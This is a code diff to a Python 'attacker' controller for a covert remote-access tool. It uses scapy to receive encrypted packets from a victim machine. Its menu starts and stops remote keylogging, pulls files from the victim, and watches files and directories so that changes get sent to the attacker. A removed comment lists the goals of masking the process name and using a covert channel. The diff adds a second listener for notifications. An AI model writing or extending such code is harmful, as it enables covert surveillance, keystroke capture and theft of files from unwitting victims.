@@ -1,18 +1,5 @@
 #!/usr/bin/env python3
 
-"""
-- Create attacker/victim programs
-- Mask process name
-- Probably use covert channel
-
-- Menu:
-    - Start/stop keylogger
-    - Transfer file from victim to attacker
-    - Start/stop watching file for changes. If change, transfer to attacker
-    - Start/stop watching directory. If change, transfer to attacker
-
-"""
-
 
 from scapy.all import *
 from multiprocessing import Process
@@ -21,11 +8,26 @@ import encryption as encryption
 
 
 is_running = False
+processes_list = []
 
 
 def sniff_response():
     while True:
         sniff(filter="ip and tcp and host 192.168.1.65 and dst port 8500", count=1, prn=read_pkt)
+
+
+def sniff_notifs():
+    while True:
+        sniff(filter="ip and tcp and host 192.168.1.65 and dst port 8888", count=1, prn=print_notifs)
+
+
+def print_notifs(pkt):
+    notification = pkt[Raw].load
+
+    notification_split = notification.split(b"$NOTIF")
+    decrypted_notif = encryption.decrypt_data(notification_split[0]).decode("utf-8")
+
+    print(decrypted_notif)
 
 
 def read_pkt(pkt):
@@ -53,9 +55,11 @@ def decrypt_response():
     filename = ""
 
     # Write decrypted contents to file
-    if mode == "keylog":
+    if "keylog" in mode:
         filename = "keylog.txt"
-    
+    else:
+        filename = mode
+
     with open(filename, "wb") as file:
         file.write(decrypted)
 
@@ -80,9 +84,15 @@ def init_func(mode, *args):
 
 
 def main():
-    # Initializing sniffing functionality, to receive responses from victim
+    # Initializing sniffing functionalities
     sniff_process = Process(target=sniff_response)
-    sniff_process.start()
+    notifs_process = Process(target=sniff_notifs)
+    
+    processes_list.append(sniff_process)
+    processes_list.append(notifs_process)
+
+    for process in processes_list:
+        process.start()
 
     print("Select option (e.g., 1 for keylogging). Enter 'q' to quit:\n")
     print("[1] Remote keylogging\n[2] Get file\n[3] Watch a file\n[4] Watch a directory\n[q] Quit")
@@ -91,7 +101,7 @@ def main():
 
     # Parse menu options
     while True:
-        option = input("> ")
+        option = input("")
 
         # Remote keylogging
         if option == "1":    
@@ -107,24 +117,24 @@ def main():
         # Get file
         elif option == "2":
             if is_running == False:
-                print("[Get file] Started")
+                print("[Get a file] Started")
                 is_running = True
                 init_func("getfile")
             else:
-                print("[Get file] Stopped")
+                print("[Get a file] Stopped")
                 is_running = False
                 init_func("getfile")
         
         # Watch file
         elif option == "3":
             if is_running == False:
-                print("[Watch file] Started")
+                print("[Watch a file] Started")
                 is_running = True
 
-                filename = input("Name of file to watch:\n>> ")
+                filename = input("Name of file to watch:\n")
                 init_func("watchfile", filename)
             else:
-                print("[Watch file] Stopped")
+                print("[Watch a file] Stopped")
                 is_running = False
                 init_func("watchfile")
             # break
@@ -132,11 +142,13 @@ def main():
         # Watch directory
         elif option == "4":
             if is_running == False:
-                print("[Watch directory] Started")
+                print("[Watch a directory] Started")
                 is_running = True
-                init_func("watchdir")
+
+                dirname = input("Name of directory to watch:\n")
+                init_func("watchdir", dirname)
             else:
-                print("[Watch directory] Stopped")
+                print("[Watch a directory] Stopped")
                 is_running = False
                 init_func("watchdir")
             # break
@@ -146,7 +158,9 @@ def main():
             print("Bye!")
 
             # Cleanup processes and send shutdown signal to victim
-            sniff_process.terminate()
+            for process in processes_list:
+                process.terminate()
+
             init_func("quit")
 
             break
@@ -163,4 +177,8 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         print("Exiting program...")
+
+        for process in processes_list:
+            process.terminate()
+
         sys.exit()
